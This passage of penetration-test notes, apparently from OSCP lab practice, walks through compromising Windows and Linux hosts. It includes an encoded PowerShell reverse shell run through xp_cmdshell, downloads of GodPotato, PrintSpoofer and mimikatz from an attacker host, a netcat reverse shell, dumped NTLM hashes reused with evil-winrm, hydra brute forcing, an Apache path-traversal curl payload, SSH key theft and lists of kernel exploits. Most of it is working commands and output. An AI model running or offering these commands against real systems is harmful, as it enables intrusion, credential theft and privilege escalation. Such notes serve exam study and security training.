+  10.10.116.255         ff-ff-ff-ff-ff-ff     static       
+  224.0.0.22            01-00-5e-00-00-16     static       
+  224.0.0.251           01-00-5e-00-00-fb     static       
+  239.255.255.250       01-00-5e-7f-ff-fa     static   
+
+[Agent : NT AUTHORITY\SYSTEM@MS01] » ifconfig
+│ Interface 0                                   │
+│ Name         │ Ethernet0                      │
+│ Hardware MAC │ 00:50:56:ab:e3:1e              │
+│ MTU          │ 1500                           │
+│ Flags        │ up|broadcast|multicast|running │
+│ IPv4 Address │ 192.168.156.147/24             │
+
+│ Interface 1                                   │
+│ Name         │ Ethernet1                      │
+│ Hardware MAC │ 00:50:56:ab:4a:9a              │
+│ MTU          │ 1500                           │
+│ Flags        │ up|broadcast|multicast|running │
+│ IPv4 Address │ 10.10.116.147/24               │
+
+│ Interface 2                                  │
+│ Name         │ Loopback Pseudo-Interface 1   │
+│ Hardware MAC │                               │
+│ MTU          │ -1                            │
+│ Flags        │ up|loopback|multicast|running │
+│ IPv6 Address │ ::1/128                       │
+│ IPv4 Address │ 127.0.0.1/8                   │
+
+# Set up listener from MS01 to local kali 
+[Agent : NT AUTHORITY\SYSTEM@MS01] » listener_add --addr 0.0.0.0:443 --to 0.0.0.0:443
+[Agent : NT AUTHORITY\SYSTEM@MS01] » listener_list
+│ Active listeners                                                                                                      
+│ 0 │ #2 - NT AUTHORITY\SYSTEM@MS01 - 192.168.156.147:60359 │ tcp     │ 0.0.0.0:443            │ 0.0.0.0:443   
+
+
+				# REVERSE SHELL: 
+As you can see, you are pointing to MS01 tunnel and catching it to local kali 
+Make sure to b64 encode it and launch it as follows:
+
+# REVERSE SHELL:
+https://www.revshells.com/
+- POWERSHELL BASE64 ENCODED 
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nvlp 443    
+
+SQL> exec xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAxADYALgAxADQANwAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzAAEMAbABvAHMAZQAoACkA'
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nvlp 443                          
+[sudo] password for kali: 
+listening on [any] 443 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 40936
+
+PS C:\Windows\system32> whoami
+nt service\mssql$sqlexpress
+
+PS C:\Windows\system32> hostname
+MS02
+
+
+			# FILE TRANSFER: Ligalo 
+PS C:\Users\Public\Downloads> PS C:\Users\Public\Downloads> ipconfig
+Windows IP Configuration
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.116.148
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.116.254
+
+# Add a network interface and routing
+sudo ip route add 240.0.0.1/32 dev ligolo
+# The listener proxy redirect to address 
+listener_add --addr 0.0.0.0:1237 --to 127.0.0.1:8000
+# Python server open in directory for files to transfer 
+python3 -m http.server 8000
+# Upload file: Your pivoting machine is 147 you should send your web request to 147 machine
+Invoke-WebRequest -Uri "http://10.10.116.147:1237/GodPotato-NET4.exe" -OutFile GodPotato.exe
+Invoke-WebRequest -Uri "http://10.10.116.147:1237/nc64.exe" -OutFile nc64.exe
+Invoke-WebRequest -Uri "http://10.10.116.147:1237/LaZagne.exe" -OutFile laz.exe
+iwr -uri http://10.10.116.147:1237/PrintSpoofer64.exe -Outfile print.exe
+
+
+				PRIV ESC: 
+PS C:\Users\Administrator> whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+
+			SeImpersonatePrivilege: 
+PrintSpoofer64: DIDNT WORK 
+iwr -uri http://10.10.116.147:1237/PrintSpoofer64.exe -Outfile print.exe
+.\print.exe -i -c powershell.exe
+.\print.exe -i -c cmd.exe
+
+GODPOTATO: because its a webserver 
+Invoke-WebRequest -Uri "http://10.10.116.147:1237/GodPotato-NET4.exe" -OutFile GodPotato.exe
+.\GodPotato.exe -cmd "cmd /c whoami"
+
+CREATE NEW LISTENER: use MO01 again to tunnel reverse shell to Local Kali 
+listener_add --addr 0.0.0.0:1238 --to 127.0.0.1:8000
+.\GodPotato.exe -cmd "C:\Users\Public\Downloads\nc64.exe -t -e C:\Windows\System32\cmd.exe 10.10.116.147 1238"
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 8000
+listening on [any] 8000 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 55916
+Microsoft Windows [Version 10.0.19042.1586]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Public\Downloads>whoami
+nt authority\system
+
+				CREDS: HANGS
+# LaZagne:
+iwr -uri http://192.168.45.170:5555/LaZagne.exe -Outfile laz.exe
+PS C:\Users\Public\Downloads> .\laz.exe all
+[+] 0 passwords have been found.
+
+				MIMIKATZ: 
+Invoke-WebRequest -Uri "http://10.10.116.147:1237/mimikatz.exe" -OutFile mimi.exe
+
+PS C:\Users\Public\Downloads> .\mimi.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : OSCP
+         * NTLM     : 59b280ba707d22e3ef0aa587fc29ffe5
+         * SHA1     : f41a495e6d341c7416a42abd14b9aef6f1eb6b17
+         * DPAPI    : 959ad2ea78c63aebf3233679ad90d769
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : OSCP
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : OSCP.EXAM
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 126575 (00000000:0001ee6f)
+Session           : Service from 0
+User Name         : MSSQL$SQLEXPRESS
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 3/29/2024 9:06:02 PM
+SID               : S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
+        msv :
+         [00000003] Primary
+         * Username : MS02$
+         * Domain   : OSCP
+         * NTLM     : b5686dd572713800d9474e8ba3ce264c
+         * SHA1     : 0e7bf7ade739b1d2b8c822f053d4bb65756edbd3
+        tspkg :
+        wdigest :
+         * Username : MS02$
+         * Domain   : OSCP
+         * Password : (null)
+        kerberos :
+         * Username : MS02$
+         * Domain   : oscp.exam
+
+Authentication Id : 0 ; 125600 (00000000:0001eaa0)
+Session           : Service from 0
+User Name         : SQLTELEMETRY$SQLEXPRESS
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 3/29/2024 9:06:02 PM
+SID               : S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965
+        msv :
+         [00000003] Primary
+         * Username : MS02$
+         * Domain   : OSCP
+         * NTLM     : b5686dd572713800d9474e8ba3ce264c
+         * SHA1     : 0e7bf7ade739b1d2b8c822f053d4bb65756edbd3
+        tspkg :
+        wdigest :
+         * Username : MS02$
+         * Domain   : OSCP
+         * Password : (null)
+        kerberos :
+         * Username : MS02$
+         * Domain   : oscp.exam
+
+Authentication Id : 0 ; 83401 (00000000:000145c9)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/29/2024 9:06:02 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : MS02$
+         * Domain   : OSCP
+         * NTLM     : f0fbae9774187037e5d553d1c8c24236
+         * SHA1     : 744eb9990465c3e1053457f0a3e82d4dcecbb20c
+        tspkg :
+        wdigest :
+         * Username : MS02$
+         * Domain   : OSCP
+         * Password : (null)
+        kerberos :
+         * Username : MS02$
+         * Domain   : oscp.exam
+	
+				ACCESS: DC 
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.10.116.146 -u Administrator -H 59b280ba707d22e3ef0aa587fc29ffe5
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+oscp\administrator
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> hostname
+DC01
+
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+    Directory: C:\Users\Administrator\Desktop
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        5/10/2024   7:34 PM             34 proof.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat proof.txt
+c67ce0f687c76da3ad082a6ac7d8a82a
+
+--------------------------------------------------------------------------------------------------
+			192.168.154.149 - Kiero ✅
+FTP: 21
+SSH: 22
+HTTP: 80
+				NMAP: TCP
+nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.154.149
+
+FTP: 21
+21/tcp open  ftp     syn-ack vsftpd 3.0.3
+
+SSH: 22
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 5c:5f:f1:bb:02:f9:14:7c:8e:38:32:2b:f4:bc:d0:8c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpq949oDZn92JdQSJlEAq6xKU8bpUale/NvVjLe4SQ2Lcxg6ZkLtHT0ojs6dkYDWgJ0mfmMxbYwihnnmqg9OTy9bALU8Ds2yuux0hR5dOu+7FY3xoLyvXi/rBk6eK1OwJb+6WS7D2dGZk54tdTDQoD9Wou/FI6DQjF3FIFDMcPrf2td5ZcmG73lyA8/ypNToGhlEZGs336j8zci6W3GrnEtZjyGeRorgjWyhKPFeHVIYFeY7WmbMRtTGgRYiTD4VsLnuwTeByLpWAAa72PADEFDHMwUV26++ZOUtv5sBeKba6IveeLKfne8tlRAUPTJU9akRVoniFnpYcjQj4Cf1V2nENhvpAc49A0CBKg/EpY+sZDjO4uBGfalgo9Zg4XbLguPHZNoy6yAZE4nynMyiarIz8hxfelEyyC1DWEo1r3cdxsNvcLrhPOUJvNDIZ2gHF6/6ZEDmRhE3WDuqnqNKx1viAL8Wsc24nUkzOqRXoy84KyjNufsYQ7eUCzLYF3fGU=
+|   256 18:e2:47:e1:c8:40:a1:d0:2c:a5:87:97:bd:01:12:27 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKVG56zocb+S5VrZ1skgpWuln90XqZBX4XkvYI22WQrLPgU5qC//tymdaPFGB0+i/vzLSe0MYF9vG7too2SrxSI=
+|   256 26:2d:98:d9:47:6d:22:5d:4a:14:7a:24:5c:98:a2:1d (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA/RHrflzpHbnGWFK9saJQrvJcwVNTQwkgeYQTuDjvVO
+
+HTTP: 80
+80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+				NMAP: UDP
+sudo nmap -sU -O 192.168.154.149
+161/udp   open          snmp
+990/udp   open|filtered ftps
+19605/udp open|filtered unknown
+34433/udp open|filtered unknown
+
+
+				FTP: 21
+┌──(kali㉿kali)-[~]
+└─$ ftp 192.168.154.149
+Connected to 192.168.154.149.
+220 (vsFTPd 3.0.3)
+Name (192.168.154.149:kali): anonymous
+530 Permission denied.
+ftp: Login failed
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap --script ftp-vsftpd-backdoor -p 21 192.168.154.149
+
+wget -m ftp://anonymous:anonymous@192.168.154.149:990
+
+BRUTEFORCE: 
+hydra -l me -P /usr/share/wordlists/rockyou.txt 192.168.154.149 -t 4 ftp
+1 of 1 target completed, 0 valid password found
+hydra -l kiero -P /usr/share/wordlists/rockyou.txt 192.168.154.149 -t 4 ftp
+
+
+				SSH: 22
+BRUTE FORCE: me
+┌──(kali㉿kali)-[~]
+└─$ hydra -l me -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.154.149 
+
+ssh me@192.168.154.149
+"_triggerFire"
+
+				HTTP: 80
+┌──(kali㉿kali)-[~]
+└─$ feroxbuster -u http://192.168.154.149/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e  
+200      GET      375l      964w    10918c http://192.168.154.149/index.html
+200      GET       15l       74w     6147c http://192.168.154.149/icons/ubuntu-logo.png
+200      GET      375l      964w    10918c http://192.168.154.149/
+
+┌──(kali㉿kali)-[~]
+└─$ feroxbuster -u http://192.168.154.149/ -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+200      GET       15l       74w     6147c http://192.168.154.149/icons/ubuntu-logo.png
+200      GET      375l      964w    10918c http://192.168.154.149/
+200      GET      375l      964w    10918c http://192.168.154.149/index.html
+
+SEARCHSPLOIT: 
+Apache HTTP Server 2.4.41
+https://www.exploit-db.com/exploits/50383
+curl -s --path-as-is -d "echo Content-Type: text/plain; echo;" "http://192.168.154.149/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+
+
+				snmp: 161
+SNMPWALK: 
+┌──(kali㉿kali)-[~]
+└─$ snmpwalk -c public -v1 -t 10 192.168.154.149
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux oscp 5.9.0-050900-generic #202010112230 SMP Sun Oct 11 22:34:01 UTC 2020 x86_64"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (1281058) 3:33:30.58
+iso.3.6.1.2.1.1.4.0 = STRING: "Me <me@example.org>"
+iso.3.6.1.2.1.1.5.0 = STRING: "oscp"
+iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
+iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+
+iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.9.0-050900-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro
+
+iso.3.6.1.2.1.25.2.3.1.3.1 = STRING: "Physical memory"
+iso.3.6.1.2.1.25.2.3.1.3.3 = STRING: "Virtual memory"
+iso.3.6.1.2.1.25.2.3.1.3.6 = STRING: "Memory buffers"
+iso.3.6.1.2.1.25.2.3.1.3.7 = STRING: "Cached memory"
+iso.3.6.1.2.1.25.2.3.1.3.8 = STRING: "Shared memory"
+iso.3.6.1.2.1.25.2.3.1.3.10 = STRING: "Swap space"
+iso.3.6.1.2.1.25.2.3.1.3.35 = STRING: "/run"
+iso.3.6.1.2.1.25.2.3.1.3.36 = STRING: "/"
+iso.3.6.1.2.1.25.2.3.1.3.38 = STRING: "/dev/shm"
+iso.3.6.1.2.1.25.2.3.1.3.39 = STRING: "/run/lock"
+iso.3.6.1.2.1.25.2.3.1.3.40 = STRING: "/sys/fs/cgroup"
+iso.3.6.1.2.1.25.2.3.1.3.63 = STRING: "/boot"
+iso.3.6.1.2.1.25.2.3.1.3.72 = STRING: "/run/snapd/ns"
+
+
+┌──(kali㉿kali)-[~]
+└─$ snmpwalk -c public -v2c -t 10 192.168.154.149
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux oscp 5.9.0-050900-generic #202010112230 SMP Sun Oct 11 22:34:01 UTC 2020 x86_64"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (1498080) 4:09:40.80
+iso.3.6.1.2.1.1.4.0 = STRING: "Me <me@example.org>"
+iso.3.6.1.2.1.1.5.0 = STRING: "oscp"
+iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
+iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+
+97.105.108.117.114.101 = STRING: "_snmpd"
+iso.3.6.1.2.1.88.1.4.3.1.2.6.95.115.110.109.112.100.95.109.116.101.84.114.105.103.103.101.114.70.97.108.108.105.110.103 = STRING: "_snmpd"
+iso.3.6.1.2.1.88.1.4.3.1.2.6.95.115.110.109.112.100.95.109.116.101.84.114.105.103.103.101.114.70.105.114.101.100 = STRING: "_snmpd"
+iso.3.6.1.2.1.88.1.4.3.1.2.6.95.115.110.109.112.100.95.109.116.101.84.114.105.103.103.101.114.82.105.115.105.110.103 = STRING: "_snmpd"
+iso.3.6.1.2.1.88.1.4.3.1.3.6.95.115.110.109.112.100.95.108.105.110.107.68.111.119.110 = STRING: "_linkUpDown"
+iso.3.6.1.2.1.88.1.4.3.1.3.6.95.115.110.109.112.100.95.108.105.110.107.85.112 = STRING: "_linkUpDown"
+iso.3.6.1.2.1.88.1.4.3.1.3.6.95.115.110.109.112.100.95.109.116.101.84.114.105.103.103.101.114.70.97.105.108.117.114.101 = STRING: "_triggerFail"
+iso.3.6.1.2.1.88.1.4.3.1.3.6.95.115.110.109.112.100.95.109.116.101.84.114.105.103.103.101.114.70.97.108.108.105.110.103 = STRING: "_triggerFire"
+iso.3.6.1.2.1.88.1.4.3.1.3.6.95.115.110.109.112.100.95.109.116.101.84.114.105.103.103.101.114.70.105.114.101.100 = STRING: "_triggerFire"
+iso.3.6.1.2.1.88.1.4.3.1.3.6.95.115.110.109.112.100.95.109.116.101.84.114.105.103.103.101.114.82.105.115.105.110.103 = STRING: "_triggerFire"
+iso.3.6.1.2.1.92.1.1.1.0 = Gauge32: 1000
+
+
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp
+It is recommanded to install the following to see whats does mean each OID gathered from the device:
+sudo apt-get install snmp-mibs-downloader
+
+┌──(kali㉿kali)-[~]
+└─$ snmpwalk -c public -v2c 192.168.154.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
+NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
+NET-SNMP-EXTEND-MIB::nsExtendCommand."RESET" = STRING: ./home/john/RESET_PASSWD
+NET-SNMP-EXTEND-MIB::nsExtendArgs."RESET" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendInput."RESET" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendCacheTime."RESET" = INTEGER: 5
+NET-SNMP-EXTEND-MIB::nsExtendExecType."RESET" = INTEGER: exec(1)
+NET-SNMP-EXTEND-MIB::nsExtendRunType."RESET" = INTEGER: run-on-read(1)
+NET-SNMP-EXTEND-MIB::nsExtendStorage."RESET" = INTEGER: permanent(4)
+NET-SNMP-EXTEND-MIB::nsExtendStatus."RESET" = INTEGER: active(1)
+NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."RESET" = STRING: Resetting password of kiero to the default value
+NET-SNMP-EXTEND-MIB::nsExtendOutputFull."RESET" = STRING: Resetting password of kiero to the default value
+NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."RESET" = INTEGER: 1
+NET-SNMP-EXTEND-MIB::nsExtendResult."RESET" = INTEGER: 0
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."RESET".1 = STRING: Resetting password of kiero to the default value
+
+┌──(kali㉿kali)-[~]
+└─$ snmpbulkwalk -c public -v2c 192.168.154.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
+
+
+				FTP:
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ftp kiero@192.168.154.149
+Connected to 192.168.154.149.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password: kiero
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> ls
+229 Entering Extended Passive Mode (|||10100|)
+150 Here comes the directory listing.
+-rwxr-xr-x    1 114      119          2590 Nov 21  2022 id_rsa
+-rw-r--r--    1 114      119           563 Nov 21  2022 id_rsa.pub
+-rwxr-xr-x    1 114      119          2635 Nov 21  2022 id_rsa_2
+226 Directory send OK.
+
+ftp> get id_rsa
+local: id_rsa remote: id_rsa
+229 Entering Extended Passive Mode (|||10099|)
+150 Opening BINARY mode data connection for id_rsa (2590 bytes).
+100% |****************************************************|  2590       68.61 MiB/s    00:00 ETA
+226 Transfer complete.
+2590 bytes received in 00:00 (166.82 KiB/s)
+
+ftp> get id_rsa.pub
+local: id_rsa.pub remote: id_rsa.pub
+229 Entering Extended Passive Mode (|||10092|)
+150 Opening BINARY mode data connection for id_rsa.pub (563 bytes).
+100% |****************************************************|   563        9.94 MiB/s    00:00 ETA
+226 Transfer complete.
+563 bytes received in 00:00 (23.57 KiB/s)
+
+ftp> get id_rsa_2
+local: id_rsa_2 remote: id_rsa_2
+229 Entering Extended Passive Mode (|||10100|)
+150 Opening BINARY mode data connection for id_rsa_2 (2635 bytes).
+100% |****************************************************|  2635       61.29 MiB/s    00:00 ETA
+226 Transfer complete.
+2635 bytes received in 00:00 (174.68 KiB/s)
+
+
+				SSH: local.txt
+sudo chmod 600 id_rsa
+sudo chmod 600 id_rsa_2
+
+sudo ssh -i id_rsa -p 22 john@192.168.154.149
+sudo ssh -i id_rsa -p 22 kiero@192.168.154.149
+
+sudo ssh -i id_rsa_2 -p 22 john@192.168.154.149
+sudo ssh -i id_rsa_2 -p 22 kiero@192.168.154.149
+
+
+┌──(kali㉿kali)-[~/Desktop/B/149]
+└─$ sudo ssh -i id_rsa -p 22 john@192.168.154.149
+
+john@oscp:~$ id
+uid=1000(john) gid=1000(john) groups=1000(john)
+
+john@oscp:~$ whoami
+john
+
+john@oscp:~$ ls
+RESET_PASSWD  local.txt
+
+john@oscp:~$ cat local.txt
+6ab300278aca74cc0284cb314d0940c2
+
+john@oscp:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+john:x:1000:1000:john:/home/john:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+ftp:x:114:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+Debian-snmp:x:115:120::/var/lib/snmp:/bin/false
+kiero:x:1001:1001::/home/kiero:/bin/bash
+
+john@oscp:~$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+
+john@oscp:~$ history
+
+				NETWORK:
+john@oscp:~$ ifconfig
+ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.154.149  netmask 255.255.255.0  broadcast 192.168.154.255
+        ether 00:50:56:ab:72:d8  txqueuelen 1000  (Ethernet)
+        RX packets 2145650  bytes 315629336 (315.6 MB)
+        RX errors 0  dropped 8504  overruns 0  frame 0
+        TX packets 2004670  bytes 904557009 (904.5 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 216  bytes 19760 (19.7 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 216  bytes 19760 (19.7 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+				CREDS:
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+
+
+				FILES:
+john@oscp:~$ find / -name "local.txt" -ls 2> /dev/null
+  1179989      4 -rw-r--r--   1 john     john           33 May  8 04:42 /home/john/local.txt
+
+john@oscp:~$ find / -name "proof.txt" -ls 2> /dev/null
+john@oscp:~$ find / -name "*.zip" -ls 2> /dev/null
+john@oscp:~$ find / -name "*.git" -ls 2> /dev/null
+
+
+				PRIV ESC: proof.txt
+┌──(kali㉿kali)-[~/Desktop/LINUX-PRIV]
+└─$ python3 -m http.server 8000
+
+john@oscp:/tmp$ wget http://192.168.45.180:8000/linpeas.sh
+john@oscp:/tmp$ chmod +x linpeas.sh
+
+john@oscp:/tmp$ wget http://192.168.45.180:8000/pspy64  
+john@oscp:/tmp$ chmod +x pspy64
+
+LINPEAS:
+Writable folder: /dev/shm
+Distributor ID: Ubuntu
+Description:    Ubuntu 20.04.5 LTS
+Release:        20.04
+
+╔══════════╣ Sudo version
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                  
+Sudo version 1.8.31                                                                              
+
+╔══════════╣ Executing Linux Exploit Suggester
+╚ https://github.com/mzet-/linux-exploit-suggester                                               
+[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops                                   
+   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
+   Exposure: probable
+   Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
+   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
+   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
+https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
+   Exposure: less probable
+   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
+   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+[+] [CVE-2022-2586] nft_object UAF
+   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
+   Exposure: less probable
+   Tags: ubuntu=(20.04){kernel:5.12.13}
+   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+[+] [CVE-2022-0847] DirtyPipe
+   Details: https://dirtypipe.cm4all.com/
+   Exposure: less probable
+   Tags: ubuntu=(20.04|21.04),debian=11
+   Download URL: https://haxx.in/files/dirtypipez.c
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: less probable
+   Tags: ubuntu=20.04{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
